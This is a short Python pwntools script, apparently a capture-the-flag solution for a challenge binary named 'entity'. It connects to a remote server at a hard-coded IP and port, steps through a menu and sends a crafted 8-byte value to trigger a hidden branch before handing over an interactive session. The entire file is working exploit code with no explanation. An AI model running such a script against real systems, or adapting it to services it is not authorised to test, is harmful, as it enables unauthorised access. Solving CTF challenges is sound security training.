#!/usr/bin/env python 
import pwn

def main():
    # p = pwn.process('./entity')
    p = pwn.connect("167.71.137.174", 30363)
    p.sendlineafter(b">>", b"T")
    p.sendlineafter(b">>", b"S")
    p.sendlineafter(b">>", b"\xc9\x07\xcc\x00\x00\x00\x00\x00")
    p.sendlineafter(b">>", b"R")
    p.sendlineafter(b">>", b"L")
    p.sendlineafter(b">>", b"C")
    p.interactive()




if __name__ == '__main__':
    main()